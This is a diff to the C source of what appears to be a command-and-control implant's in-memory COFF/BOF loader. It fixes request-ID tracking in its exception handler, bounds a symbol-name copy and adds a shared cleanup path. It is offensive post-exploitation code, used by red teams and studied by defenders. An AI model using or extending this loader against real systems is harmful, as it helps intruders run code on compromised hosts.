@@ -28,10 +28,14 @@
 #endif
 
 PVOID CoffeeFunctionReturn = NULL;
+#ifdef _MSC_VER
+__declspec( thread ) UINT32 CoffeeRequestID = 0;
+#else
+__thread UINT32 CoffeeRequestID = 0;
+#endif
 
 LONG WINAPI VehDebugger( PEXCEPTION_POINTERS Exception )
 {
-    UINT32 RequestID = 0;
     PPACKAGE Package = NULL;
 
     PRINTF( "Exception: %p\n", Exception->ExceptionRecord->ExceptionCode )
@@ -43,11 +47,8 @@ LONG WINAPI VehDebugger( PEXCEPTION_POINTERS Exception )
     Exception->ContextRecord->Eip = (DWORD64)(ULONG_PTR)CoffeeFunctionReturn;
 #endif
 
-    // TODO: obtaining the RequestID this way is almost surely not correct
-    //       given that CoffeeFunctionReturn won't point to BOF code but Demon code
-    //       also, if two BOFs are running at the same time, this VEH impl won't work
-    if ( GetRequestIDForCallingObjectFile( CoffeeFunctionReturn, &RequestID ) ) {
-        Package = PackageCreateWithRequestID( DEMON_COMMAND_INLINE_EXECUTE, RequestID );
+    if ( CoffeeRequestID ) {
+        Package = PackageCreateWithRequestID( DEMON_COMMAND_INLINE_EXECUTE, CoffeeRequestID );
     } else {
         Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );
     }
@@ -94,10 +95,14 @@ BOOL CoffeeProcessSymbol( PCOFFEE Coffee, LPSTR SymbolName, UINT16 SymbolType, P
     DWORD       SymBeacon       = HashEx( SymbolName, COFF_PREP_BEACON_SIZE, FALSE );
     ANSI_STRING AnsiString      = { 0 };
     PPACKAGE    Package         = NULL;
+    SIZE_T      SymLen          = StringLengthA( SymbolName );
 
     *pFuncAddr = NULL;
 
-    MemCopy( Bak, SymbolName, StringLengthA( SymbolName ) + 1 );
+    if ( SymLen >= sizeof( Bak ) )
+        goto SymbolNotFound;
+
+    MemCopy( Bak, SymbolName, SymLen + 1 );
 
     if ( SymBeacon == COFF_PREP_BEACON )
     {
@@ -260,6 +265,7 @@ BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE
     ULONG FunctionLength = StringLengthA( Function );
     ULONG Protection     = 0;
     ULONG BitMask        = 0;
+    BOOL  Result         = FALSE;
 
     if ( Instance->Config.Implant.CoffeeVeh )
     {
@@ -269,7 +275,7 @@ BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE
         if ( ! VehHandle )
         {
             PACKAGE_ERROR_WIN32
-            return FALSE;
+            goto Cleanup;
         }
     }
 
@@ -309,7 +315,7 @@ BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE
             if ( ! Success )
             {
                 PUTS( "Failed to protect memory" )
-                return FALSE;
+                goto Cleanup;
             }
         }
     }
@@ -321,7 +327,7 @@ BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE
         if ( ! Success )
         {
             PUTS( "Failed to protect memory" )
-            return FALSE;
+            goto Cleanup;
         }
     }
 
@@ -357,7 +363,7 @@ BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE
         PackageAddString( Package, Function );
         PackageTransmit( Package );
 
-        return FALSE;
+        goto Cleanup;
     }
 
     // make sure the entry point is on executable memory
@@ -377,18 +383,22 @@ BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE
     if ( ! Success )
     {
         PRINTF( "The entry point (%p) is not on executable memory\n", CoffeeMain )
-        return FALSE;
+        goto Cleanup;
     }
 
     PUTS( "[*] Execute coffee main\n" );
+    CoffeeRequestID = RequestID;
     CoffeeFunction( CoffeeMain, Argument, Size );
+    CoffeeRequestID = 0;
 
-    // Remove our exception handler
+    Result = TRUE;
+
+Cleanup:
     if ( VehHandle ) {
         Instance->Win32.RtlRemoveVectoredExceptionHandler( VehHandle );
     }
 
-    return TRUE;
+    return Result;
 }
 
 VOID CoffeeCleanup( PCOFFEE Coffee )
